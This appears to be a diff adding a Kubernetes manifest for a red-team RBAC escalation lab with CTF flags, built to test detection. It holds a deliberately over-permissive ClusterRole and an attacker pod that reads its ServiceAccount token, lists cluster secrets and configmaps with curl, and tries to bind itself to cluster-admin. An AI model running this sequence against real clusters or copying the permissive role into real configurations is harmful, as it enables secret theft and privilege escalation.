@@ -1,0 +1,214 @@
+# RBAC Escalation Test Workload
+# Red Team Attack Scenario: ATK-001
+# Purpose: Test RBAC bypass detection capabilities
+# WARNING: For authorized testing only in Red Team cluster
+
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: rbac-testing
+  labels:
+    team: red
+    attack-scenario: ATK-001
+    battleground: IDEA-101
+
+---
+# Over-permissive ServiceAccount (intentionally vulnerable)
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: overpermissive-sa
+  namespace: rbac-testing
+  labels:
+    vulnerability: intentional
+    attack-type: rbac-bypass
+
+---
+# Overly broad ClusterRole (attack surface)
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRole
+metadata:
+  name: attack-cluster-reader
+  labels:
+    attack-scenario: ATK-001
+rules:
+  # Intentionally over-permissive for testing detection
+  - apiGroups: [""]
+    resources: ["secrets", "configmaps", "pods"]
+    verbs: ["get", "list", "watch"]
+  - apiGroups: [""]
+    resources: ["pods/exec", "pods/portforward"]
+    verbs: ["create"]
+  - apiGroups: ["rbac.authorization.k8s.io"]
+    resources: ["clusterroles", "clusterrolebindings"]
+    verbs: ["get", "list"]
+
+---
+# Binding the overpermissive role
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: attack-cluster-reader-binding
+  labels:
+    attack-scenario: ATK-001
+subjects:
+  - kind: ServiceAccount
+    name: overpermissive-sa
+    namespace: rbac-testing
+roleRef:
+  kind: ClusterRole
+  name: attack-cluster-reader
+  apiGroup: rbac.authorization.k8s.io
+
+---
+# Attacker Pod - RBAC Escalation
+apiVersion: v1
+kind: Pod
+metadata:
+  name: rbac-escalation-attacker
+  namespace: rbac-testing
+  labels:
+    app: rbac-attacker
+    attack-scenario: ATK-001
+    team: red
+  annotations:
+    attack.description: "RBAC privilege escalation test pod"
+    attack.ttd-target: "30s"
+    attack.mitre: "T1528"
+spec:
+  serviceAccountName: overpermissive-sa
+  containers:
+    - name: attacker
+      image: alpine:latest
+      command:
+        - /bin/sh
+        - -c
+        - |
+          echo "🔴 RED TEAM: RBAC Escalation Attack Starting..."
+          
+          # Install curl and kubectl
+          apk add --no-cache curl jq
+          
+          # Get ServiceAccount token
+          TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+          CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+          NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
+          API_SERVER="https://kubernetes.default.svc"
+          
+          echo "[*] Token obtained from mounted secret"
+          echo "[*] Namespace: $NAMESPACE"
+          
+          # Test API access with stolen token
+          echo "[*] Testing API access..."
+          
+          # List secrets (should trigger Falco)
+          echo "[!] Attempting to list secrets in all namespaces..."
+          curl -s --cacert $CACERT \
+            -H "Authorization: Bearer $TOKEN" \
+            "$API_SERVER/api/v1/secrets" | jq '.items[].metadata.name' 2>/dev/null | head -10
+          
+          # List configmaps
+          echo "[!] Attempting to list configmaps..."
+          curl -s --cacert $CACERT \
+            -H "Authorization: Bearer $TOKEN" \
+            "$API_SERVER/api/v1/configmaps" | jq '.items[].metadata.name' 2>/dev/null | head -10
+          
+          # Try to list RBAC resources
+          echo "[!] Attempting to enumerate RBAC..."
+          curl -s --cacert $CACERT \
+            -H "Authorization: Bearer $TOKEN" \
+            "$API_SERVER/apis/rbac.authorization.k8s.io/v1/clusterroles" | jq '.items[].metadata.name' 2>/dev/null | head -10
+          
+          # Attempt privilege escalation
+          echo "[!] Attempting to create cluster-admin binding (should fail)..."
+          curl -s --cacert $CACERT \
+            -H "Authorization: Bearer $TOKEN" \
+            -H "Content-Type: application/json" \
+            -X POST \
+            -d '{
+              "apiVersion": "rbac.authorization.k8s.io/v1",
+              "kind": "ClusterRoleBinding",
+              "metadata": {"name": "attack-admin-binding"},
+              "subjects": [{"kind": "ServiceAccount", "name": "overpermissive-sa", "namespace": "rbac-testing"}],
+              "roleRef": {"kind": "ClusterRole", "name": "cluster-admin", "apiGroup": "rbac.authorization.k8s.io"}
+            }' \
+            "$API_SERVER/apis/rbac.authorization.k8s.io/v1/clusterrolebindings"
+          
+          echo "[*] Attack sequence complete. Waiting for detection..."
+          
+          # Keep pod running for analysis
+          while true; do
+            echo "[*] Attack pod still running ($(date))"
+            sleep 60
+          done
+      resources:
+        limits:
+          cpu: "100m"
+          memory: "128Mi"
+        requests:
+          cpu: "50m"
+          memory: "64Mi"
+      securityContext:
+        runAsNonRoot: true
+        runAsUser: 1000
+        allowPrivilegeEscalation: false
+        readOnlyRootFilesystem: false
+        capabilities:
+          drop:
+            - ALL
+
+---
+# Flag ConfigMap (CTF objective)
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: ctf-flag-001
+  namespace: rbac-testing
+  labels:
+    ctf: CTF-001
+    sensitivity: high
+data:
+  flag: "FLAG{sa_overly_permissive}"
+  description: "You found the RBAC vulnerability flag!"
+
+---
+# Secret Flag (harder objective)
+apiVersion: v1
+kind: Secret
+metadata:
+  name: admin-secret-flag
+  namespace: rbac-testing
+  labels:
+    ctf: CTF-001
+    sensitivity: critical
+type: Opaque
+data:
+  # FLAG{token_extracted_successfully} base64 encoded
+  flag: RkxBR3t0b2tlbl9leHRyYWN0ZWRfc3VjY2Vzc2Z1bGx5fQ==
+  admin-token: ZmFrZS1hZG1pbi10b2tlbi1mb3ItdGVzdGluZw==
+
+---
+# Cleanup Job (for automated cleanup after 30 minutes)
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: rbac-attack-cleanup
+  namespace: rbac-testing
+  labels:
+    attack-scenario: ATK-001
+spec:
+  ttlSecondsAfterFinished: 100
+  backoffLimit: 1
+  template:
+    spec:
+      restartPolicy: Never
+      containers:
+        - name: cleanup
+          image: alpine:latest
+          command:
+            - /bin/sh
+            - -c
+            - |
+              echo "Cleanup scheduled for 30 minutes from now"
+              sleep 1800
+              echo "Attack workload TTL expired"
